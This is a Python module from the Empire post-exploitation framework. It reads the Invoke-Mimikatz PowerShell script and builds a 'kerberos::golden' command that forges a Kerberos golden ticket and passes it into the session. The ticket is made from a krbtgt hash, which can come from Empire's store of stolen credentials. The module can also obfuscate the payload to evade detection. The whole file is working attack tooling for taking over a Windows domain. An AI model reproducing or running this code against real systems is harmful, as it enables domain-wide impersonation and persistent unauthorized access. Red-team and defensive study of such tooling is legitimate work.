from __future__ import print_function

from builtins import str
from builtins import object
from empire.server.common import helpers
from typing import Dict

from empire.server.common.module_models import PydanticModule


class Module(object):
    @staticmethod
    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):
        
        # read in the common module source code
        module_source = main_menu.installPath + "/data/module_source/credentials/Invoke-Mimikatz.ps1"
        if obfuscate:
            helpers.obfuscate_module(moduleSource=module_source, obfuscationCommand=obfuscation_command)
            module_source = module_source.replace("module_source", "obfuscated_module_source")
        try:
            f = open(module_source, 'r')
        except:
            print(helpers.color("[!] Could not read module source path at: " + str(module_source)))
            return ""

        module_code = f.read()
        f.close()

        script = module_code

        # if a credential ID is specified, try to parse
        cred_id = params["CredID"]
        if cred_id != "":
            
            if not main_menu.credentials.is_credential_valid(cred_id):
                print(helpers.color("[!] CredID is invalid!"))
                return ""

            (cred_id, credType, domainName, userName, password, host, os, sid, notes) = main_menu.credentials.get_credentials(cred_id)[0]
            if userName != "krbtgt":
                print(helpers.color("[!] A krbtgt account must be used"))
                return ""

            if domainName != "":
                params["domain"] = domainName
            if sid != "":
                params["sid"] = sid
            if password != "":
                params["krbtgt"] = password


        if params["krbtgt"] == "":
            print(helpers.color("[!] krbtgt hash not specified"))

        # build the golden ticket command        
        script_end = "Invoke-Mimikatz -Command '\"kerberos::golden"

        for option,values in params.items():
            if option.lower() != "agent" and option.lower() != "credid":
                if values and values != '':
                    script_end += " /" + str(option) + ":" + str(values)

        script_end += " /ptt\"'"
        if obfuscate:
            script_end = helpers.obfuscate(main_menu.installPath, psScript=script_end, obfuscationCommand=obfuscation_command)
        script += script_end
        script = helpers.keyword_obfuscation(script)

        return script
